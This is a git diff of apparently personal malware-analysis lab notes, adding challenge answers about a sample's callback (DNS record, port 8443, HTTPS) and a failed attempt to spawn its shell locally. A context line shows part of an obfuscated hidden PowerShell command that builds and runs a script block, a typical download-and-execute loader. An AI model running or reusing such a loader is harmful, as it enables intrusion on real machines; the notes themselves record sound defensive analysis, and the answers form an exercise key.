@@ -123,6 +123,8 @@ powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Obj
 Decoded payload from powershell
 ![[Pasted image 20230726215139.png]]
 
+Connected to shell without SSL cert
+![[Pasted image 20230726220835.png]]
 
 ___
 ### Challenge Questions:
@@ -153,11 +155,13 @@ ___
  - What is the DNS record that is queried at detonation?
 	`bonus2.corporatebonusapplication.local`
  - What is the callback port number at detonation?
-	`2559`
+	`8443`
  - What is the callback protocol at detonation?
-	`HTTP`
+	`HTTPS`
  - How can you use host-based telemetry to identify the DNS record, port, and protocol?
+	`Using TCPView / Wireshark we can capture this data`
  - Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?
+	 `We are able to connect but cannot use becasue are are missing the SSL cert as this is using HTTPS`
 
 
 
